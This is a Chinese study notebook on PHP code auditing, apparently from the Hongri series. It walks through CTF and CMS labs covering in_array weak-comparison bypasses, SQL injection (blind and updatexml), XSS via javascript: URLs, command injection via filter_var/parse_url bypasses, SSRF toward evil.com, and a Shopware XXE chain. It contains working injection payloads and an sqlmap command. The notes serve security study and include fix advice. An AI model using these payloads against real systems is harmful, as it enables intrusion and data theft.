# 红日审计

## day1

### CTF起手

题目叫做 Wish List，代码如下：

```php
<?php
class  Challenge{
    const UPLOAD_DIRECTORY = 'D:/phpstudy/WWW/security/hongri/day1/solutions/';
    private $file;
    private $whitelist;
    public function __construct($file){
        $this->file = $file;
        $this->whitelist = range(1,24);
    }
    public function __destruct(){
        if (in_array($this->file['name'],$this->whitelist)){
            move_uploaded_file(
              $this->file['tmp_name'],
                self::UPLOAD_DIRECTORY.$this->file['name']
            );
        }
    }
}

$challenge = new Challenge($_FILES['solution']);
```

构造前台代码如下:

```html
<html>
<head>
  <meta charset="utf-8">
  <title></title>
</head>
<body>

<form action="wish_list.php" method="post" enctype="multipart/form-data">
  <label for="solution">文件名：</label>
  <input type="file" name="solution" id="solution"><br>
  <input type="submit" name="submit" value="提交">
</form>

</body>
</html>
```

**漏洞解析** ：

这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 **in_array()** 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 **true** ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 **7shell.php** 。因为PHP在使用 **in_array()** 函数判断时，会将 **7shell.php** 强制转换成数字7，而数字7在 **range(1,24)** 数组中，最终绕过 **in_array()** 函数判断，导致任意文件上传漏洞。（这里之所以会发生强制类型转换，是因为目标数组中的元素为数字类型）我们来看看PHP手册对 **in_array()** 函数的定义。

>[ **in_array** ](http://php.net/manual/zh/function.in-array.php)：(PHP 4, PHP 5, PHP 7)
>
>**功能** ：检查数组中是否存在某个值
>
>**定义** ： `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` 
>
>在 **$haystack** 中搜索 **$needle** ，如果第三个参数 **$strict** 的值为 **TRUE** ，则 **in_array()** 函数会进行强检查，检查 **$needle** 的类型是否和 **$haystack** 中的相同。如果找到 **$haystack** ，则返回 **TRUE**，否则返回 **FALSE**。

**结果**：

<img src=".\图片\Snipaste_2023-04-02_18-09-24.png" alt="Snipaste_2023-04-02_18-09-24" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-04-02_18-10-33.png" alt="Snipaste_2023-04-02_18-10-33" style="zoom:80%;" />



### CMS实例

#### 先找终点（危险处）

在 `include\functions_rate.inc.php` 中发现可能存在 sql 注入，`$rate` 变量是否可控有无过滤，分析后简化源码如下：

```php
<?php
function rate_picture($image_id, $rate)
{
    if (!isset($rate)
      or !$conf['rate']
      or !in_array($rate, $conf['rate_items']))   //此处过滤，但没完全过滤，in_array()函数没使用第三个参数为 true
  {
    return false;
  }
$query = 'INSERT
  INTO '.RATE_TABLE.'
  (user_id,anonymous_id,element_id,rate,date)
  VALUES
  ('
    .$user['id'].','
    .'\''.$anonymous_id.'\','
    .$image_id.','
    .$rate                           // $rate 直接拼接 sql
    .',NOW())
;';
  pwg_query($query);    
```

另外 `$conf['rate_items']` 的内容可以在 `include\config_default.inc.php` 中找到，为 `$conf['rate_items'] = array(0,1,2,3,4,5);`

由于这里并没有将 **in_array()** 函数的第三个参数设置为 **true** ，所以会进行弱比较，可以绕过。比如我们将 **$rate** 的值设置成 **`1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#`** 那么SQL语句就变成：

```sql
INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,'192.168.2',1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;
```



假如我们能控制 `$rate`  变量，则可以造成 sql 注入，接下来该寻找哪些地方调用了 `rate_picture()` 函数

#### 起点可控处

在 `picture.php` 中，发现调用了 `rate_picture()` 函数，简化源码分析如下：

```php
if (isset($_GET['action']))
{
  switch ($_GET['action'])
  {
case 'rate' :
    {
      include_once(PHPWG_ROOT_PATH.'include/functions_rate.inc.php');
      rate_picture($page['image_id'], $_POST['rate']);
      redirect($url_self);
    }
  }
}
```

当 `GET：action=rate  且 POST：rate=注入payload`  便可能注入成功

这样就可以进行盲注了，如果上面的代码你看的比较乱的话，可以看下面简化后的代码：

<img src=".\图片\Snipaste_2023-04-02_20-06-43.png" alt="Snipaste_2023-04-02_20-06-43" style="zoom:80%;" />

#### sqlmap测试

```bash
python sqlmap.py -u "http://127.0.0.1:8081/piwigo/picture.php?/1/category/1&action=rate" --data "rate=1" --dbs --batch
```

其中 `http://127.0.0.1:8081/piwigo/picture.php?/1/category/1` 是我们手动插入网站测试数据得到的 url

<img src=".\图片\Snipaste_2023-04-02_20-05-24.png" alt="Snipaste_2023-04-02_20-05-24" style="zoom:80%;" />

#### 修复建议

可以看到这个漏洞的原因是弱类型比较问题，那么我们就可以使用强匹配进行修复。例如将 **in_array()** 函数的第三个参数设置为 **true** ，或者使用 **intval()** 函数将变量强转成数字，又或者使用正则匹配来处理变量。

### CTF收尾

#### 题目

index.php

```php
<?php
include 'config.php';
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("连接失败: ");
}

$sql = "SELECT COUNT(*) FROM users";
$whitelist = array();
$result = $conn->query($sql);
if($result->num_rows > 0){
    $row = $result->fetch_assoc();
    $whitelist = range(1, $row['COUNT(*)']);
}

$id = stop_hack($_GET['id']);
$sql = "SELECT * FROM users WHERE id=$id";

if (!in_array($id, $whitelist)) {           //in_array 未设置第三个参数为 true，代码属于白写 ，id=1'是可以成功绕过 
    die("id $id is not in whitelist.");
}

$result = $conn->query($sql);
if($result->num_rows > 0){
    $row = $result->fetch_assoc();
    echo "<center><table border='1'>";
    foreach ($row as $key => $value) {
        echo "<tr><td><center>$key</center></td><br>";
        echo "<td><center>$value</center></td></tr><br>";
    }
    echo "</table></center>";
}
else{
    die($conn->error);
}

?>
```

config.php

```php
<?php  
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "day1";

function stop_hack($value){
    $pattern = "insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval";
    $back_list = explode("|",$pattern);
    foreach($back_list as $hack){
        if(preg_match("/$hack/i", $value))
            die("$hack detected!");
    }
    return $value;
}
?>
```

#### 分析

实际上这道题目考察的是 **in_array** 绕过和不能使用拼接函数的 **updatexml** 注入，我们先来看一下 **in_array** 的绕过。在代码中，程序把用户的ID值存储在 **$whitelist** 数组中，然后将用户传入的 **id** 参数先经过stop_hack函数过滤，然后再用 **in_array** 来判断用户传入的 **id** 参数是否在 **$whitelist** 数组中。这里 **in_array** 函数没有使用强匹配，所以是可以绕过的，例如： **id=1'** 是可以成功绕过 **in_array** 函数的

然后在说说 **updatexml** 注入，这题的注入场景也是在真实环境中遇到的。当 **updatexml** 中存在特殊字符或字母时，会出现报错，报错信息为特殊字符、字母及之后的内容，也就是说如果我们想要查询的数据是数字开头，例如 **7701HongRi** ，那么查询结果只会显示 **HongRi** 。所以我们会看到很多 **updatexml** 注入的 **payload** 是长这样的 **and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)** ,在所要查询的数据前面凭借一个特殊符号(这里的 **0x7e** 为符号 **'~'** )

再看 `stop_hack()` 函数未过滤 报错注入的 updatexml

#### 答案

```
?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))
```

```http
http://127.0.0.1:8081/security/hongri/day1/ctf/index.php?id=1%20and%20(select%20updatexml(1,make_set(3,%27~%27,(select%20flag%20from%20flag)),1))
```

### 拓展updatexml的技巧

[updatexml injection without concat - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2160)

当使用 `updatexml()` 的 `hex` 进行报错注入读数据时，可能会发生数据丢失的情况。原因是 `updatexml` 中存在特殊字符、字母时，会出现报错，**报错信息为特殊字符、字母及之后的内容**，而 `hex` 出的数据包含字母和数字，所以第一个字母前面的内容都会丢失，如下：

<img src=".\图片\Snipaste_2023-04-03_16-11-24.png" alt="Snipaste_2023-04-03_16-11-24" style="zoom:80%;" />

既然 updatexml 函数是从特殊字符、字母后面开始截取的，我们就需要在我们想要的数据前面拼接上特殊字符。当waf禁用了concat等常见字符串拼接函数，那么我们可以**使用冷门的字符串处理函数绕过**，这里感谢`雨了个雨`师傅提供的payload

```sql
mysql> select updatexml(1,make_set(3,'~',(select user())),1);
```

<img src=".\图片\Snipaste_2023-04-03_16-13-38.png" alt="Snipaste_2023-04-03_16-13-38" style="zoom:80%;" />

关于 make_set 函数的用法，可以参考：[mysql MAKE_SET()用法](http://blog.csdn.net/fangzy0112/article/details/27323603) ，我们还可以找到类似的函数：lpad()、reverse()、repeat()、export_set()

（**lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据**）

```sql
mysql> select updatexml(1,lpad('@',30,(select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhostroot@localhostr@'


mysql> select updatexml(1,repeat((select user()),2),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhostroot@localhost'


mysql> select updatexml(1,(select user()),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhost'
mysql> select updatexml(1,reverse((select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '@toor'


mysql> select updatexml(1,export_set(1|2,'::',(select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '::,::,root@localhost,root@localh'
```

还有一个要注意的是：updatexml报错最多只能显示**32位**，我们结合SUBSTR函数来获取数据就行了。

## day2

### CTF起手

题目叫做Twig，代码如下：

<img src=".\图片\1.png" alt="1" style="zoom:80%;" />

**漏洞解析** ：

这一关题目实际上用的是PHP的一个模板引擎 [Twig](https://twig.symfony.com/) ，本题考察XSS(跨站脚本攻击)漏洞。虽然题目代码分别用了 **escape** 和 **filter_var** 两个过滤方法，但是还是可以被攻击者绕过。在上图 **第8行** 中，程序使用 [Twig](https://twig.symfony.com/) 模板引擎定义的 **escape** 过滤器来过滤link，而实际上这里的 **escape** 过滤器，是用PHP内置函数 **htmlspecialchars** 来实现的，具体可以点击 [这里](https://twig.symfony.com/doc/2.x/filters/escape.html) 了解 **escape** 过滤器， **htmlspecialchars** 函数定义如下：

> [ **htmlspecialchars** ](http://php.net/manual/zh/function.htmlspecialchars.php) ：(PHP 4, PHP 5, PHP 7)
>
> **功能** ：将特殊字符转换为 HTML 实体
>
> **定义** ：string **htmlspecialchars** ( string `$string` [, int `$flags` = ENT_COMPAT | ENT_HTML401 [, string`$encoding` = ini_get("default_charset") [, bool `$double_encode` = **TRUE** ]]] )
>
> ```bash
> & (& 符号)  ===============  &amp;
> " (双引号)  ===============  &quot;
> ' (单引号)  ===============  &apos;
> < (小于号)  ===============  &lt;
> > (大于号)  ===============  &gt;
> ```

第二处过滤在 **第17行** ，这里用了 **filter_var** 函数来过滤 **nextSlide** 变量，且用了 **FILTER_VALIDATE_URL** 过滤器来判断是否是一个合法的url，具体的 **filter_var** 定义如下：

>[ **filter_var** ](http://php.net/manual/zh/function.filter-var.php)： (PHP 5 >= 5.2.0, PHP 7)
>
>**功能** ：使用特定的过滤器过滤一个变量
>
>**定义** ：[mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) **filter_var** ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$variable` [, int `$filter` = FILTER_DEFAULT [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$options` ]] )

针对这两处的过滤，我们可以考虑使用 **javascript伪协议** 来绕过。为了让大家更好理解，请看下面的demo代码：

<img src=".\图片\2.png" alt="2" style="zoom:80%;" />

我们使用 **payload** ：`?nextSlide=javascript://comment％250aalert(1)` ，可以执行 **alert** 函数：

<img src=".\图片\3.png" alt="3" style="zoom:80%;" />

实际上，这里的 **//** 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 **alert** 函数呢？那是因为我们这里用了字符 **%0a** ，该字符为换行符，所以 **alert** 语句与注释符 **//** 就不在同一行，就能执行。当然，这里我们要对 **%** 百分号编码成 **%25** ，因为程序将浏览器发来的payload：`javascript://comment％250aalert(1)` 先解码成： `javascript://comment%0aalert(1)` 存储在变量 **$url** 中（上图第二行代码），然后用户点击a标签链接就会触发 **alert** 函数。

### CTF收尾

[红日安全代码审计Day2 - filter_var函数缺陷详解](https://blog.csdn.net/qq_45951598/article/details/110357696)

题目如下：

<img src=".\图片\6.png" alt="6" style="zoom:80%;" />

这道CTF题目，实际上考察的是 **filter_var** 函数的绕过与远程命令执行。在题目 **第6行** ，程序使用 **exec** 函数来执行 **curl** 命令，这就很容易让人联系到命令执行。所以我们看看用于拼接命令的 **$site_info['host']** 从何而来。在题目 **第2-4行** ，可以看到  **$site_info** 变量是从用户传来的 **url** 参数经过 **filter_var** 和 **parse_url** 两个函数过滤而来。之后，又规定当 **url** 参数的值以 **sec-redclub.com** 结尾时，才会执行 **exec** 函数。

所以让我们先来绕过 **filter_var** 的 **FILTER_VALIDATE_URL** 过滤器，这里提供几个绕过方法，如下：

```bash
http://localhost/index.php?url=http://demo.com@sec-redclub.com
http://localhost/index.php?url=http://demo.com&sec-redclub.com
http://localhost/index.php?url=http://demo.com?sec-redclub.com
http://localhost/index.php?url=http://demo.com/sec-redclub.com
http://localhost/index.php?url=demo://demo.com,sec-redclub.com
http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/
http://localhost/index.php?url=http://demo.com#sec-redclub.com
PS:最后一个payload的#符号，请换成对应的url编码 %23
```

接着要绕过 **parse_url** 函数，并且满足 **$site_info['host']** 的值以 **sec-redclub.com** 结尾，payload如下：

```bash
http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/
```

<img src=".\图片\7.png" alt="7" style="zoom:80%;" />

当我们直接用 **cat f1agi3hEre.php** 命令的时候，过不了 **filter_var** 函数检测，因为包含空格，具体payload如下：

```bash
http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/
```

所以我们可以换成 **cat<f1agi3hEre.php** 命令，即可成功获取flag：

<img src=".\图片\8.png" alt="8" style="zoom:80%;" />

关于 **filter_var** 函数绕过更多的细节，大家可以参考这篇文章：[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058) ，关于命令执行绕过技巧，大家可以参考这篇文章：[浅谈CTF中命令执行与绕过的小技巧](http://www.freebuf.com/articles/web/137923.html) 。

### 拓展filter_var

#### 语法

[PHP filter_var() 函数 (w3school.com.cn)](https://www.w3school.com.cn/php/func_filter_var.asp)

filter_var() 函数通过指定的过滤器过滤变量。

如果成功，则返回已过滤的数据，如果失败，则返回 false。

语法：

```
filter_var(variable, filter, options)
```

实例：

```php
<?php
if(!filter_var("someone@example....com", FILTER_VALIDATE_EMAIL))
 {
 echo("E-mail is not valid");
 }
else
 {
 echo("E-mail is valid");
 }
?>
```

输出类似：

```
E-mail is not valid
```

#### 跟随文章

[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058)

其它拓展 [ ssrf绕过filter_var函数使用file_get_contents读取任意文件](https://blog.csdn.net/qq_46091464/article/details/108570212)

##### 0x01 PHP中易受攻击的代码

以下是我用来测试的PHP脚本：

```php
<?php
   echo "Argument: ".$argv[1]."\n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/baidu.com$/', $r['host'])) {
         // get page from URL
         exec('curl -v -s "'.$r['host'].'"', $a);
         print_r($a);
      } else {
         echo "Error: Host not allowed"."\n";
      }
   } else {
      echo "Error: Invalid URL"."\n";
   }
?>
```

如您所见，脚本从第一个参数中获取 URL（可以是web应用中的post方式或者get方式），然后使用函数 `filter_var()` 来验证 URL 的格式。如果没问题，解析函数 parse_url() 会解析 URL，再使用函数 preg_match() 用正则表达式来检查主机名是否以 baidu.com 结尾。

如果一切正常，脚本会通过 curl 发起一个 http 请求以获取目标网页内容，之后使用 print_r() 打印出响应主体。

关于 `parse_url()` 函数 [PHP中 函数parse_url用法-php教程-PHP中文网](https://www.php.cn/php-weizijiaocheng-386973.html)

##### 0x02 预期行为

此PHP脚本只能接受针对 baidu.com 主机名的请求，其余目标一律拒绝，不如让我们试一试：

尝试请求：`http://baidu.com`

<img src=".\图片\Snipaste_2023-04-03_18-12-05.png" alt="Snipaste_2023-04-03_18-12-05"  />

尝试请求：`http://evil.com`

<img src=".\图片\Snipaste_2023-04-03_18-18-17.png" alt="Snipaste_2023-04-03_18-18-17"  />

##### 0x03 绕过URL验证和正则表达式

在上文我并不美观的代码中，正则表达用于检验请求主机名是否以 baidu.com 结尾。这似乎很难避免，但倘若你熟悉URI RFC语法，你应该明白**分号和逗号**可能是你利用远程主机上的 ssrf 的秘密武器。

许多 URL 方案中都有保留字符，保留字符都有特定含义。它们在URL的方案特定部分中的外观具有指定的语义。如果在一个方案中保留了与八位组相对应的字符，则该八位组必须被编码。除了字符“;”, “/”, “?”, “:”, “@”, “=” 和 “&” 被定义为保留字符，其余一律为不保留字符。

除了分层路径中的dot-segments之外，一般语法认为路径段不透明。 生成应用程序的URI通常使用段中允许的保留字符来分隔scheme-specific或者dereference-handler-specific子组件。 例如分号(“；”) 和等于(“=”) 保留字符通常用于分隔适用于该段的参数和参数值。 逗号(“，”) 保留字符通常用于类似目的。

例如，一个URI生产者可能使用一个段 name;v=1.1 来表示对 “name” 版本 1.1 的引用，而另一个可能使用诸如 “name，1.1” 的段来表示相同含义。参数类型可以由 scheme-specific 语义来定义，但在大多数情况下，一个参数的语法是特定的URI引用算法的实现。



例如，若应用于主机 `evil.com;baidu.com` 可能会被 curl 或者 wget 解析成 hostname: evil.com 和 querystring: baidu.com，不如来试一下： `http://evil.com;baidu.com`

<img src=".\图片\Snipaste_2023-04-03_18-23-00.png" alt="Snipaste_2023-04-03_18-23-00" style="zoom: 150%;" />

​                                                                   尝试用 ;baidu.com bypass 过滤器



函数 filter_var() 可以解析许多类型的 URL schema，从上面可以看出 filter_var() 拒绝以主机名和 “HTTP” 作为 schema 验证我请求的URL，但如果我把 schema 从 http:// 改成别的会怎样呢？

```
0://evil.com;baidu.com
```

<img src=".\图片\Snipaste_2023-04-03_18-26-19.png" alt="Snipaste_2023-04-03_18-26-19"  />

​                                                                              过滤器被使用0代替HTTP bypass掉了



完美！成功绕过filter_var() 和preg_match()，但是curl依然请求不到evil.com页面。。。。为什么呢？不如来尝试下使用别的语法，尽量让 `;baidu.com` 不被解析成主机名的一部分，例如通过制定目标端口：

```
0://evil.com:80;baidu.com:80/
```

<img src=".\图片\Snipaste_2023-04-03_18-32-19.png" alt="Snipaste_2023-04-03_18-32-19" style="zoom:80%;" />

​                                                                          SSRF使curl对evil.com进行了请求而不是baidu.com



耶，我们看到curl已经开始连接evil.com，使用逗号代替分号会出现同样的情况 ：

```
0://evil.com:80,baidu.com:80/
```

<img src=".\图片\Snipaste_2023-04-03_18-34-20.png" alt="Snipaste_2023-04-03_18-34-20" style="zoom:80%;" />



##### 0x04 对URL解析函数进行SSRF

parse_url()是用于解析一个 URL 并返回一个包含在 URL 中出现的各种组成部分关联数组的PHP函数。这个函数并不是要验证给定的URL，它只是将它分解成上面列出的部分。 部分网址也可以作为parse_url()的输入并被尽可能的正确解析。

在一个PHP脚本中去bypass一个用于将部分字符串转换为一个变量的的正则表达式是我们最喜欢研究的技术之一。这项工作是否成功最终将由Bash来认定。例如：

```
0://evil$baidu.com
```

<img src=".\图片\Snipaste_2023-04-03_18-37-11.png" alt="Snipaste_2023-04-03_18-37-11"  />

​                                                                  使用“Bash中变量的语法”来绕过过滤器并利用SSRF



使用这种方式，我让bash将$baidu分析为一个空变量，并且使用curl请求了`evil <empty> .com`。 这是不是很酷？:)

然而这只发生在 curl 语法中。 实际上，正如上面的屏幕截图所示，由parse_url()解析的主机名仍然是 evil$baidu.com。 $ baidu变量并没有被解释。 只有当使用了exec()函数而且脚本又使用$r[‘host’]来创建一个curl HTTP请求时，Bash才会将其转换为一个空变量。

显然，这个工作只是为了防止PHP脚本使用exec()或system()函数来调用像curl，wget之类的系统命令。



##### 0x05 win环境中data:// 之于XSS

另一个使用 file_get_contents() 代替 PHP 使用 system() 或 exec() 调用 curl 的例子：

```php
<?php
   echo "Argument: ".$argv[1]."n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with baidu.com
      if(preg_match('/baidu.com$/', $r['host'])) {
         // get page from URL
         $a = file_get_contents($argv[1]);
         echo($a);
      } else {
         echo "Error: Host not allowed"."\n";
      }
   } else {
      echo "Error: Invalid URL"."\n";
   }
?>
```



正如你所见，file_get_contents() 在使用之前描述的相同技术验证之后使用了原始参数变量。 让我们尝试通过注入一些文本来修改响应主体，如“I Love PHP”：

```kotlin
data://text/plain;base64,SSBsb3ZlIFBIUAo=baidu.com
```

<img src=".\图片\Snipaste_2023-04-03_18-42-41.png" alt="Snipaste_2023-04-03_18-42-41"  />

​                                                                                   尝试控制响应主体



parse_url() 不允许将文本设置为请求主机，并且它返回了 “not allowed host” 正确拒绝解析。不要绝望！ 有一件事我们可以做，我们可以尝试将某些东西 **注入 URI 的 MIME 类型部分**……因为在这种情况下，PHP不关心MIME类型…也是，又有谁在乎呢？

```
data://baidu.com/plain;base64,SSBsb3ZlIFBIUAo=
```

<img src=".\图片\Snipaste_2023-04-03_18-45-28.png" alt="Snipaste_2023-04-03_18-45-28"  />

​                                                                               向响应体注入 “I love PHP”



接下来进行XSS攻击便是小菜一碟了…

```
data://text.baidu.com/plain;base64,<...b64...>
```

<img src=".\图片\t01fa3cc222d2adb74f.png" alt="t01fa3cc222d2adb74f" style="zoom:80%;" />



## day3

[PHP代码审计03之实例化任意对象漏洞 ](https://cloud.tencent.com/developer/article/1731639)

### CTF起手

题目叫做雪花，代码如下：

<img src=".\图片\sssssss.png" alt="sssssss" style="zoom:80%;" />

**漏洞解析** ：

这段代码中存在两个安全漏洞。第一个是文件包含漏洞，上图第8行中使用了 **class_exists()** 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 **__autoload** 函数，那么在使用 **class_exists()** 函数就会自动调用本程序中的 **__autoload** 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 **路径穿越** 来包含任意文件，当然使用路径穿越符号的前提是 **PHP5~5.3(包含5.3版本)版本** 之间才可以。例如类名为： **../../../../etc/passwd** 的查找，将查看passwd文件内容，我们来看一下PHP手册对 **class_exists()** 函数的定义：

>[ class_exists ](http://php.net/manual/zh/function.class-exists.php) ：(PHP 4, PHP 5, PHP 7)
>
>**功能** ：检查类是否已定义
>
>**定义** ： `bool class_exists ( string $class_name[, bool $autoload = true ] )` 
>
>**$class_name** 为类的名字，在匹配的时候不区分大小写。默认情况下 **$autoload** 为 **true** ，当 **$autoload** 为 **true** 时，会自动加载本程序中的 **__autoload** 函数；当 **$autoload** 为 **false** 时，则不调用 **__autoload** 函数。

我们再来说说第二个漏洞。在上图第9行中，我们发现实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 **SimpleXMLElement** 来进行 **XXE** 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 **SimpleXMLElement** 类的定义：

>[SimpleXMLElement](http://php.net/manual/zh/class.simplexmlelement.php) ：(PHP 5, PHP 7)
>
>**功能** ：用来表示XML文档中的元素，为PHP的内置类。
>
>详细的请看下面，重点是第六条，下面要用到它。
>
>1.  SimpleXMLElement:：addAttribute-向SimpleXML元素添加属性 
>2.  SimpleXMLElement:：addChild-向XML节点添加子元素 
>3.  SimpleXMLElement:：asXML-基于SimpleXML元素返回格式良好的XML字符串 
>4.  SimpleXMLElement:：attributes-标识元素的属性 
>5.  SimpleXMLElement:：children-查找给定节点的子节点 
>6.  SimpleXMLElement::__construct-创建新的SimpleXMLElement对象 
>7.  SimpleXMLElement:：count-计算元素的子级 
>8.  ExtSimpleNamespaces:：GetDocElement-在文档命名空间中声明 
>9.  SimpleXMLElement:：getName-获取XML元素的名称 
>10.  SimpleXMLElement:：getNamespaces-返回文档中使用的命名空间 
>11.  SimpleXMLElement:：registerXPathNamespace-为下一个XPath查询创建前缀/ns上下文 
>12.  SimpleXMLElement:：saveXML-别名SimpleXMLElement:：asXML 
>13.  SimpleXMLElement::__toString -返回字符串内容 
>14.  SimpleXMLElement:：xpath-对XML数据运行XPath查询

关于 **SimpleXMLElement** 导致的XXE攻击，下面再给出一个demo案例，方便大家理解：

<img src=".\图片\sss2.png" alt="sss2" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-04-05_15-36-48.png" alt="Snipaste_2023-04-05_15-36-48" style="zoom:80%;" />

### CMS实例

Shopware 5.3.3 （XXE）

#### 从起点寻找利用链

`engine\Shopware\Controllers\Backend\ProductStream.php` 文件中有一个 **loadPreviewAction()** 方法，其作用是用来预览产品流的详细信息，重要简化代码如下：

```php
public function loadPreviewAction()
{
    $conditions = $this->Request()->getParam('conditions');
    $conditions = json_decode($conditions, true);

    $sorting = $this->Request()->getParam('sort');  // $sorting 可控

    $criteria = new Criteria();

    /** @var RepositoryInterface $streamRepo */
    $streamRepo = $this->get('shopware_product_stream.repository');
    $sorting = $streamRepo->unserialize($sorting);   //关键函数，跟进看看
}    
```

该方法接收从用户传来的参数 `sort` ，然后传入 Repository 类的 unserialize 方法，我们跟进 Repository 类，查看 unserialize 方法的实现。该方法我们可以在 `engine\Shopware\Components\ProductStream\Repository.php` 文件中找到，重要简化代码如下：

```php
public function unserialize($serializedConditions)
{               // 跟进 reflector->unserialize
    return $this->reflector->unserialize($serializedConditions, 'Serialization error in Product stream');
}
```

可以看到 Repository 类的 unserialize 方法，调用的是 `LogawareReflectionHelper` 类的 unserialize 方法，该方法我们可以在 `engine\Shopware\Components\LogawareReflectionHelper.php` 文件中找到，具体代码如下：

```php
public function unserialize($serialized, $errorSource)
{
    $classes = [];
    foreach ($serialized as $className => $arguments) {
        $className = explode('|', $className);
        $className = $className[0];

        try {
            //再跟进 createInstanceFromNamedArguments 方法
            $classes[] = $this->reflector->createInstanceFromNamedArguments($className, $arguments);
        } catch (\Exception $e) {
            $this->logger->critical($errorSource . ': ' . $e->getMessage());
        }
    }

    return $classes;
}
```

这里的 **$serialized** 就是我们刚刚传入的 **sort** ，程序分别从 **sort** 中提取出值赋给 **$className** 和 **$arguments** 变量，然后这两个变量被传入 **ReflectionHelper** 类的 **createInstanceFromNamedArguments** 方法。该方法位于 `engine\Shopware\Components\ReflectionHelper.php` 文件，具体代码如下：

```php
public function createInstanceFromNamedArguments($className, $arguments)
{
/*3*/    $reflectionClass = new \ReflectionClass($className);

    if (!$reflectionClass->getConstructor()) {
        return $reflectionClass->newInstance();
    }

    $constructorParams = $reflectionClass->getConstructor()->getParameters();

    $newParams = [];
    foreach ($constructorParams as $constructorParam) {
        $paramName = $constructorParam->getName();

        if (!isset($arguments[$paramName])) {
            if (!$constructorParam->isOptional()) {
                throw new \RuntimeException(sprintf("Required constructor Parameter Missing: '$%s'.", $paramName));
            }
            $newParams[] = $constructorParam->getDefaultValue();

            continue;
        }

/*倒数第5行*/        $newParams[] = $arguments[$paramName];
    }

    return $reflectionClass->newInstanceArgs($newParams);
}
```

这里我们关注 **第3行** 代码，这里创建了一个反射类，而类的名称就是从 **$sort** 变量来的，可被用户控制利用。继续往下看，在代码倒数第5行处用 **$newParams** 作为参数，创建一个新的实例对象。而这里的  **$newParams** 是从 **$arguments[\$paramName]** 中取值的， **$arguments** 又是我们可以控制的，因为也是从 **$sort** 变量来，所以我们可以通过这里来实例化一个 **SimpleXMLElement** 类对象，形成一个XXE漏洞。下面，我们来看看具体如何利用这个漏洞

#### 漏洞利用

首先，我们需要登录后台，找到调用 **loadPreviewAction** 接口的位置，发现其调用位置如下：

<img src=".\图片\Snipaste_2023-04-05_16-58-01.png" alt="Snipaste_2023-04-05_16-58-01" style="zoom:67%;" />

当我们点击 **Refresh preview** 按钮时，就会调用 **loadPreviewAction** 方法，用BurpSuite抓到包如下：

<img src=".\图片\Snipaste_2023-04-05_17-04-01.png" alt="Snipaste_2023-04-05_17-04-01" style="zoom:80%;" />

```http
GET /shopware-5.3.3/backend/ProductStream/loadPreview?_dc=1680685398583&sort=%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D&conditions=%7B%7D&shopId=1&currencyId=1&customerGroupKey=EK&page=1&start=0&limit=25 HTTP/1.1
Host: 127.0.0.1:8081
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
X-Requested-With: XMLHttpRequest
X-CSRF-Token: XBmdfQ0FkYcuPHuuz2K6q6ctVJH9Cm
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8081/shopware-5.3.3/backend/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SHOPWAREBACKEND=qkst9194krstcn7cb6qbeoghd1; lastCheckSubscriptionDate=05042023
Connection: close
```

